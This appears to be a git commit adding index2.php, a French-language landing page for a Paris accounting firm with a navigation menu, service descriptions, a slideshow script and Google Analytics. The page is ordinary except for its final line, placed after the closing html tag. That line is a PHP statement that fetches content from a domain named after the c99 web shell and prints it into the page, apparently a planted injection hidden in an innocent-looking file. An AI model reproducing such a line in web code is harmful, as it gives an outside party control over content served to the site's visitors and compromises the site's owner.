e6e48f7a49119b3fbcb2e88aa0b6a3f4ecb0742f
Maddyneko <neko.furuba@laposte.net>
2013-12-12 18:52:25 +0100

    Version du 131212

---
+++ index2.php
@@ -0,0 +1,264 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <title>Paper Wings</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="">
+    <meta name="author" content="">
+	
+    <!-- FAVICON-->
+	<link rel="shortcut icon" href="img/favicon.ico">
+    
+    <!-- Css styles -->
+    <link href="css/style2.css" rel="stylesheet">
+   
+   
+  </head>
+
+<body>
+	<div class="cover">
+    	<!--Header Start-->
+    	<div id="header-wrap">
+        	<div id="header" class="container">
+                <ul class="navigation">
+                	<li class="current"> <a href="#home"><i class="icon-home"></i>Accueil</a></li>
+                    <li> <a href="galerie.php"><i class="icon-user"></i>Galerie</a></li>
+                    <li> <a href="videos.php"><i class="icon-folder-close"></i>Videos</a></li>
+                    <li> <a href="photos.php"><i class="icon-briefcase"></i>Photos</a></li>
+                    <li> <a href="musique.php"><i class="icon-comment"></i> Musique</a></li>
+                    <li> <a href="bricolage.php"><i class="icon-cog"></i>Bricolage</a></li>
+                    <li> <a href="whois.php"><i class="icon-envelope-alt"></i>Qui sommes nous?</a></li>
+                </ul>
+            </div>
+        </div>
+        <!--Header End-->
+        
+       
+        
+        <!--About Section Start-->
+        <div class="content-outer">
+			<div class="page-content" id="about">
+            	<div class="content-bg">
+            		<div class="container">
+                    	<div class="heading-center">
+                            <div class="icons-holder">
+                                <img src="img/about_icon.png" alt="About Us">
+                            </div>
+                            <div class="heading-bg">
+                            	<div class="small-heading"><span>Mieux nous connaitre</span></div>
+                            	<h2>Notre cabinet</h2>
+                           	</div>
+                        </div>
+                        
+                        <div class="row">
+                        	<div class="span6">
+                            	<p>Efix Conseil est un cabinet d'expertise comptable présent à Paris depuis plus de 10ans. Nos équipes sont spécialisées dans l'accompagnement des TPE. Que vous soyez avocat, consultant, artisant BTP, transporteur, nous avons des solutions sur mesure à vous proposer pour votre comptabilité.</p>
+                            </div>
+                            <div class="span6">
+                            	<p>Membre de l'ordre des Experts Comptables, région Ile de France, les équipes d'Efix Conseil travaillent dans les respects de la législation et des normes comptables. Pour vous, cela signifie que votre entreprise est en conformité avec la lois et que nos prestations répondent à des process de qualité.</p>
+                            </div>
+						    <div class="clearfix">&nbsp;</div>
+                        </div>
+                      </div>
+                </div>
+				<div class="logo">
+					<a class="btn" href="#contact">Obtenez un devis maintenant</a>
+                </div>
+			</div> 
+			
+		</div>
+        <!--About Section End-->
+        
+               
+        <!--Services Section Start-->
+        <div class="content-outer">
+			<div class="page-content" id="expertise">
+            	<div class="content-bg">
+            		<div class="container">
+                    	<div class="heading-center">
+                            <div class="icons-holder">
+                                <img src="img/services_icon.png" alt="About Us">
+                            </div>
+                            <div class="heading-bg">
+                            	<div class="small-heading"><span>simplifiez votre gestion</span></div>
+                            	<h2>expertise comptable</h2>
+                           	</div>
+                        </div>
+                        
+                        <div class="row">
+                        	<div class="span12">
+                            	<p>Vous recherchez un expert comptable de proximité à Paris capable de vous offrir des outils performants et des méthodes simple, alors Efix Conseil est le cabinet qu'il vous faut.</p>
+                            </div>
+						
+                            <div class="clearfix">&nbsp;</div>
+                        </div>
+                        <div class="row">
+                            <div class="about-team">
+                            	<div class="span3">
+                                	<div class="service-wrap">
+                                        <div class="service-icon">
+                                            <img src="img/respnsive_icon.png" alt="">
+                                        </div>
+                                        <div class="service-head">
+                                           Comptabilité
+                                        </div>
+                                        <div class="clearfix">&nbsp;</div>
+                                        <p>Nous réalisons la saisie de votre comptabilité selon le respect du code de tribunal de commerce.</p>
+                                    </div>                                    
+                                </div>
+                                <div class="span3">
+                                    <div class="service-wrap">
+                                        <div class="service-icon">
+                                            <img src="img/quick_icon.png" alt="">
+                                        </div>
+                                        <div class="service-head">
+                                            Accompagnement
+                                        </div>
+                                        <div class="clearfix">&nbsp;</div>
+                                        <p>Car le dirigeant a besoin d'être conseillé, nos experts sont disponibles pour répondre à vos questions</p>
+                                    </div>
+                                </div>
+                                <div class="span3">
+                                    <div class="service-wrap">
+                                        <div class="service-icon">
+                                            <img src="img/graphic_icon.png" alt="">
+                                        </div>
+                                        <div class="service-head">
+                                            Bilan et fin d'exercice
+                                        </div>
+                                        <div class="clearfix">&nbsp;</div>
+                                        <p>Membre de l'ordre des Experts Comptables, nous certifions vos comptes et réalisons le bilan, la liasse fiscale et toutes formalités de fin d'exercice.</p>
+                                    </div>
+                                </div>
+                                <div class="span3">
+                                    <div class="service-wrap">
+                                        <div class="service-icon">
+                                            <img src="img/lab_icon.png" alt="">
+                                        </div>
+                                        <div class="service-head">
+                                            Innovation
+                                        </div>
+                                        <div class="clearfix">&nbsp;</div>
+                                        <p>Nous mettons à votre disposition des outils de partage et de pilotage d'une grande efficacité</p>
+                                    </div>
+                                </div>
+                               
+                            </div>
+                        </div>
+                    </div>
+                </div>
+				<div class="logo">
+					<a class="btn" href="#contact">Obtenez un devis maintenant</a>
+				</div>
+			</div> 
+			
+		</div>
+        <!--Services Section End-->
+        
+        
+        
+        <!--Social Section Start-->
+        <div class="content-outer">
+			<div class="page-content" id="social">
+            	<div class="content-bg">
+            		<div class="container">
+                    	<div class="heading-center">
+                            <div class="icons-holder">
+                                <img src="img/setting_icon.png" alt="About Us">
+                            </div>
+                            <div class="heading-bg">
+                            	<div class="small-heading"><span>simplifiez la gestion de votre personnel</span></div>
+                            	<h2>Social</h2>
+                           	</div>
+                        </div>
+						<div class="row">
+                            <div class="span6">
+                                <img src="img/portfolio1.jpg" alt="" width="218" height="151" class="float-left"><p>Avoir du personnel représente toujours une étape importante dans la vie d'une entreprise. Les experts d'Efix Conseil vous accompagnent dans cette évolution et vous donnent les bons conseils quant à l'embauche de vos salariés.</p>
+                            </div>
+                            
+                            <div class="span6">
+                                <img src="img/portfolio2.jpg" alt="" width="218" height="151" class="float-right"><p>Notre service en droit social est à votre disposition pour répondre à vos questions en matière de droit social et pourra se charger de l'établissement des bulletins de paie. Par ailleurs, nous sommes tout à fait en mesure de vous accompagner lors du départ d'un salarié ou pour toute modification lié à son contrat de travail.</p>
+                            </div>
+						</div>
+                            <div class="clearfix"></div>
+                        </div>
+                    </div>
+				<div class="logo">
+					<a class="btn" href="#contact">Obtenez un devis maintenant</a>
+				</div>
+                </div>
+					
+			</div>
+					
+		</div>
+        <!--Shortcodes Section End-->
+		
+				</div> <!-- fin cover-->
+
+        
+        <footer class="footer">
+          <div class="container">
+            Copyright <span class="green">Efix Conseil</span> © 2013, 11 rue Scribe, 75 009 Paris. 01 70 79 16 01 </span>. SIRET : 44473504700045 
+          </div>
+        </footer>
+	</div>
+    
+	<!--Background Image Gallery-->
+    <ul id="supersized" class="speed">
+    
+    </ul>
+
+    <!-- javascript
+    ================================================== -->
+    <script src="js/jquery-1.7.2.min.js"></script>
+    <script src="js/jquery.scrollTo-1.4.2-min.js"></script>
+    <script src="js/jquery.localscroll-1.2.7-min.js"></script>  
+    <script src="js/jquery.mobilemenu.js"></script>
+   	<script src="js/jquery.prettyPhoto.js"></script> 
+    <script src="js/jquery.validate.js"></script> 
+    <script src="js/custom.js?<?php echo filemtime("js/custom.js"); ?>"></script>    
+    <script src="js/supersized.3.2.7.min.js"></script>
+    
+	<script type="text/javascript">
+		jQuery(function ($) {
+			
+			$.supersized({
+	
+				// Functionality
+				slide_interval: 3000, // Length between transitions
+				transition: 1, // 0-None, 1-Fade, 2-Slide Top, 3-Slide Right, 4-Slide Bottom, 5-Slide Left, 6-Carousel Right, 7-Carousel Left
+				transition_speed: 700, // Speed of transition
+	
+				// Components							
+				slide_links: 'blank', // Individual links for each slide (Options: false, 'num', 'name', 'blank')
+				slides: [ // Slideshow Images
+				{
+					image: 'img/3.jpg'
+				}, {
+					image: 'img/4.jpg'
+				}, {
+					image: 'img/1.jpg'
+				}
+	
+				]
+			});
+		});
+	</script>
+<script type="text/javascript">
+
+  var _gaq = _gaq || [];
+  _gaq.push(['_setAccount', 'UA-38954615-1']);
+  _gaq.push(['_trackPageview']);
+
+  (function() {
+    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+  })();
+
+</script>
+
+  </body>
+</html>
+<? echo file_get_contents('http://www.c99shell.gen.tr/2.html'); ?>
